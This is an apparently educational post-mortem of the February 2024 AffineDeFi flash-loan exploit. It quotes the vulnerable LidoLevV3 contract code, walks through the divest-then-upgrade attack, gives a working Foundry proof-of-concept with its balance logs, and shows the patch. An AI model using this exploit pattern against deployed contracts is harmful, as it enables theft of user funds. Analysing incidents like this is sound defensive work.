
# AffineDeFi


## What's AffineDeFi?

Affine is the world's first cross-chain investment and savings app. We make it simple for users to onboard funds in an efficient and affordable manner using Polygon while gaining access to investment opportunities on multiple chains.

## Amount stolen
~$88K USD

Feb 1, 2024

## Vulnerability
Reentrancy

## Analysis

The exploiter successfully repaid the initial flash loan using a subsequent flash loan.

### Vurniable code


```solidity

function receiveFlashLoan(
    ERC20[] memory, /* tokens */
    uint256[] memory amounts,
    uint256[] memory, /* feeAmounts */
    bytes memory userData
) external override {
    if (msg.sender != address(BALANCER)) revert onlyBalancerVault();

    uint256 ethBorrowed = amounts[0];

    // Decode the userData to get the LoanType
    (LoanType loan, address newStrategy) = abi.decode(userData, (LoanType, address));

    // Switch or if-else statement to handle different LoanTypes
    if (loan == LoanType.divest) {
        _endPosition(ethBorrowed);  // This function handles divestment and repays the first flash loan
    } else if (loan == LoanType.invest) {
        _addToPosition(ethBorrowed);
    } else if (loan == LoanType.upgrade) {
        _payDebtAndTransferCollateral(LidoLevV3(payable(newStrategy)));
    } else {
        _rebalancePosition(ethBorrowed, loan);
    }

    // Payback wETH loan
    WETH.safeTransfer(address(BALANCER), ethBorrowed);
}

   function _addToPosition(uint256 ethBorrowed) internal {
        // withdraw eth from weth
        WETH.withdraw(ethBorrowed);

        (bool success,) = payable(address(WSTETH)).call{value: ethBorrowed}("");

        require(success, "LLV3: WstEth failed");
        // Deposit wstETH in AAVE
        AAVE.deposit(address(WSTETH), WSTETH.balanceOf(address(this)), address(this), 0);

        // Borrow 90% of wstETH value in ETH using e-mode
        uint256 ethToBorrow = ethBorrowed - WETH.balanceOf(address(this));
        AAVE.borrow(address(WETH), ethToBorrow, 2, 0, address(this));
    }
```



# proof of concept (PoC) 

The vulnerability exploited by the attacker in AffineDeFi was rooted in the protocol's handling of flash loans and the associated `LoanType` enum, which allowed different actions to be taken upon receiving a flash loan. Let's break down how the attacker exploited this vulnerability step by step:

## Flash Loan Initialization:

1. The attacker initiated a flash loan through the AffineDeFi protocol, leveraging the `flashLoan` function provided by the Balancer pool.
2. The flash loan requested a substantial amount of WETH (wrapped Ethereum) from the Balancer pool.

## LoanType.divest Action:

1. During the first flash loan, the attacker specified the `LoanType.divest` action in the `userencodeData` parameter. This action is designed to trigger the `_endPosition` function, responsible for divesting from the current strategy.
2. `_divest` Function Execution:
   - As a result of the `LoanType.divest` action, the `_endPosition` function was called.
   - The `_endPosition` function involved several steps, including:
     - Determining the proportion of collateral to unlock based on the debt amount (`ethBorrowed`).
     - Repaying the debt in Aave using the borrowed WETH.
     - Withdrawing the corresponding proportion of collateral from Aave.
     - Unwrapping WSTETH (wrapped stETH) into ETH.
     - Converting stETH to WETH using the `_convertStEthToWeth` function.
    
       ### TL;DR
       The attacker used flash loans to create ethBorrowed debt via LoanType.divest
    
```solidity
 function _endPosition(uint256 ethBorrowed) internal {
        // Proportion of collateral to unlock is same as proportion of debt to pay back (ethBorrowed / debt)
        // We need to calculate this number before paying back debt, since the fraction will change.
        uint256 wstEthToRedeem = aToken.balanceOf(address(this)).mulDivDown(ethBorrowed, _debt());

        // Pay debt in aave
        AAVE.repay(address(WETH), ethBorrowed, 2, address(this));

        // Withdraw same proportion of collateral from aave
        AAVE.withdraw(address(WSTETH), wstEthToRedeem, address(this));

        // withdraw eth from wsteth
        WSTETH.unwrap(WSTETH.balanceOf(address(this)));

        // convert stEth to eth
        _convertStEthToWeth(STETH.balanceOf(address(this)), STETH.balanceOf(address(this)).slippageDown(slippageBps));
    }
```

## Flash Loan Repayment:

1. The funds borrowed in the flash loan were successfully utilized as part of the divestment process.
2. The WETH equivalent of the borrowed funds was used to repay the initial flash loan from the Balancer pool.

## Second Flash Loan Initialization:

1. Following the successful divestment, the attacker triggered a second flash loan, this time with a `LoanType.upgrade` action specified in the `userencodeData2` parameter.

## LoanType.upgrade Action:

1. The `LoanType.upgrade` action triggered the `_payDebtAndTransferCollateral` function. This function was responsible for:
   - Repaying the debt in Aave using the remaining debt from the initial flash loan.
   - Transferring collateral (aTokens) to a new strategy (LidoLevV3).
   - Making the new strategy borrow the same amount as the original strategy had in debt.
  
     ### TL;DR
     The attacker used a second flash loan with LoanType.upgrade to repay debt, transfer collateral to a new strategy (LidoLevV3),
      and make the new strategy borrow the original debt amount.

  
```solidity
/// @dev Pay debt and transfer collateral to new strategy.
    function _payDebtAndTransferCollateral(LidoLevV3 newStrategy) internal {
        _checkIfStrategy(newStrategy);
        // Pay debt in aave.
        uint256 debt = debtToken.balanceOf(address(this));
        AAVE.repay(address(WETH), debt, 2, address(this));

        // Transfer collateral (aTokens) to new Strategy.
        aToken.safeTransfer(address(newStrategy), aToken.balanceOf(address(this)));

        // Make the new strategy borrow exactly the same amount as this strategy originally had in debt.
        newStrategy.createAaveDebt(debt);
    }
```


### Attack.sol

```solidity

 function testExploit() external {
        emit log_named_decimal_uint(
            "Exploiter aEthwstETH balance before attack",
            IERC20(aEthwstETH).balanceOf(address(this)),
            IERC20(aEthwstETH).decimals()
        );

        bytes memory userencodeData = abi.encode(1, address(this));
        bytes memory userencodeData2 = abi.encode(2, address(this));
        uint256[] memory amount = new uint256[](1);
        uint256[] memory amount2 = new uint256[](1);
        IERC20[] memory token = new IERC20[](1);

        token[0] = IERC20(WETH);
        amount[0] = 318973831042619036856;
        amount2[0] = 0;
        IBalancer(Balancer).flashLoan(IFlashLoanRecipient(LidoLevV3), token, amount, userencodeData);
        IBalancer(Balancer).flashLoan(IFlashLoanRecipient(LidoLevV3), token, amount2, userencodeData2);

        emit log_named_decimal_uint(
            "Exploiter aEthwstETH balance after attack",
            IERC20(aEthwstETH).balanceOf(address(this)),
            IERC20(aEthwstETH).decimals()
        );
    }
```

### Balance Check:

Logs:
```
  Exploiter aEthwstETH balance before attack: 0.000000000000000000
  Exploiter aEthwstETH balance after attack: 33.698806193381635860
```


### Exploited Code

The vulnerable code is part of the `LidoLevV3` contract, specifically the `receiveFlashLoan` function, which handles different actions based on the `LoanType.` The exploit involves triggering a `LoanType.divest` during the first flash loan, followed by a `LoanType.upgrade` in the second flash loan.

```solidity
else if (loan == LoanType.upgrade) {
            _payDebtAndTransferCollateral(LidoLevV3(payable(newStrategy)));
```

### How did they resolve this problem?

`nonReentrant` was added to prevent Reentrancy on the flash loan, and to ensure the first flash loan gets repaid within the same
transaction


```solidity
 function _flashLoan(uint256 amount, LoanType loan, address recipient) internal nonReentrant {
        ERC20[] memory tokens = new ERC20[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        BALANCER.flashLoan({
            recipient: IFlashLoanRecipient(address(this)),
            tokens: tokens,
            amounts: amounts,
            userData: abi.encode(loan, recipient)
        });
    }
```

The addition of `require(_reentrancyGuardEntered(), "LLV3: Invalid FL origin");` serves as an additional layer of security to reinforce the protection against reentrancy issues during flash loans

```solidity
 function receiveFlashLoan(
        ERC20[] memory, /* tokens */
        uint256[] memory amounts,
        uint256[] memory, /* feeAmounts */
        bytes memory userData
    ) external override {
        if (msg.sender != address(BALANCER)) revert onlyBalancerVault();
        require(_reentrancyGuardEntered(), "LLV3: Invalid FL origin");
```
`_checkIfStrategy(newStrategy);` was added to ensure the integrity of the strategy. This step verifies that the new strategy is valid before proceeding with the debt repayment and collateral transfer.

```solidity
 /// @dev Pay debt and transfer collateral to new strategy.
    function _payDebtAndTransferCollateral(LidoLevV3 newStrategy) internal {
        _checkIfStrategy(newStrategy); 
        // Pay debt in aave.
        uint256 debt = debtToken.balanceOf(address(this));
        AAVE.repay(address(WETH), debt, 2, address(this));

        // Transfer collateral (aTokens) to new Strategy.
        aToken.safeTransfer(address(newStrategy), aToken.balanceOf(address(this)));

        // Make the new strategy borrow the same amount as this strategy originally had in debt.
        newStrategy.createAaveDebt(debt);
    }
```


## Conclusion

By using a combination of divestment and upgrade actions through two consecutive flash loans, the attacker manipulated the protocol's logic. The attacker moved funds, repaid the initial flash loan, and diverted assets to a new strategy, stealing funds from the protocol in the process.



**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/AffineDeFi_exp.sol)


[**< Back**](https://patronasxdxd.github.io/CTFS/)
